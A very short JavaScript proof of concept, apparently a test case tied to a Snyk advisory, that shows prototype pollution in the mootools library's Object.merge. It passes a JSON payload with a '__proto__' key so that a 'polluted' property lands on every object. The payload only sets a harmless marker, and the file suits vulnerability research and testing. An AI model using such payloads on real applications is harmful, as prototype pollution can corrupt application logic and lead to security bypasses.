//https://security.snyk.io/vuln/SNYK-JS-MOOTOOLS-1325536
 
  require("mootools");

   

  Object.merge.__x_toTaint = true;
  Object.merge({}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
// End of file
